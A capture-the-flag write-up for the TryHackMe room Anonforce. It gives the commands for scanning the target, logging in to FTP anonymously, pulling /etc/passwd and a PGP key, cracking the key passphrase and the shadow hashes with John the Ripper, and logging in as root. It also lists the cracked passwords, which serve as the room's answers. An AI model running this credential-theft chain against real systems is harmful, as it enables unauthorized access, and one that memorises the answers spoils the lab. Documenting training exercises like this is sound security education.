---

# Anonforce — Write-up 
Created by [zaprodil](https://tryhackme.com/p/Zaprodil)

## Overview

This document outlines the full exploitation path for the target system, starting from service enumeration, through FTP anonymous access, to cracking PGP and shadow file hashes for root access.

---

## 1. Initial Port & Service Enumeration

Performed a full TCP port scan with service and full version detection, and save results to a file:

```bash
nmap -T3 -sV --version-all -p- --open <IP> -oN open_ports_info
```

**Results:**

* **21/tcp** — FTP (vsftpd 3.0.3)
* **22/tcp** — SSH (OpenSSH 7.2p2 Ubuntu 4ubuntu2.8)
---

## 2. FTP Script Scan (NSE)

Ran NSE scripts to further enumerate FTP functionality:

```bash
nmap -T3 -p 21 -sV --version-all --script='ftp*' <ip_address>
```

**Results:**

* **Anonymous login allowed**
* Directory listing exposed full filesystem hierarchy
* `/notread/`, `/etc/` and `/home/ `were **writable**

This immediately suggested potential data exposure and the possibility of retrieving sensitive files.

---

## 3. Anonymous FTP Login

Logged in with:

```bash
ftp <ip_address> 21
```

Navigation revealed a user flag under:

```
/home/melodias/user.txt
```

---

## 4. Downloaded Sensitive Files

The following files were identified and downloaded:

* `/etc/passwd` - file contains basic user attributes
* `/notread/backup.pgp` — encrypted data
* `/notread/private.asc` — PGP private key

Downloaded them using:

```bash
mget <file_name>
```

The presence of a PGP private key suggested a decryptable backup once the key's passphrase was cracked.

---

## 5. Extracting and Cracking the PGP Private Key Passphrase

Used **gpg2john** to extract a crackable hash:

```bash
gpg2john private.asc > private.hash
```

Then cracked the passphrase using John and the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt private.hash
```

**Cracked passphrase:** `xbox360`

---

## 6. Importing Private Key & Decrypting the Backup

Imported the key:

```bash
gpg --import private.asc
```

Decrypted the PGP archive:

```bash
gpg -d backup.pgp
```

**Decryption Result:** A full **/etc/shadow** dump, including the root hash.

---

## 7. Preparing Hashes for Cracking

Merged `passwd` and `shadow` using **unshadow**:

```bash
unshadow passwd shadow > unshadow.hash
```

Cracked them using John:

```bash
john --wordlist=<wordlist> unshadow.hash
```

**Cracked root password:** `hikari`

---

## 8. Root Access & Flag Capture

Using the recovered credentials:

```bash
ssh root@<ip_address>
```

Successfully escalated to root and captured the root flag.

---

## Summary of Credentials

| User        | Password | Source              |
| ----------- | -------- | ------------------- |
| Private key | xbox360  | Cracked PGP         |
| root        | hikari   | Cracked shadow hash |

---

I hope this write up was helpful for someone (:
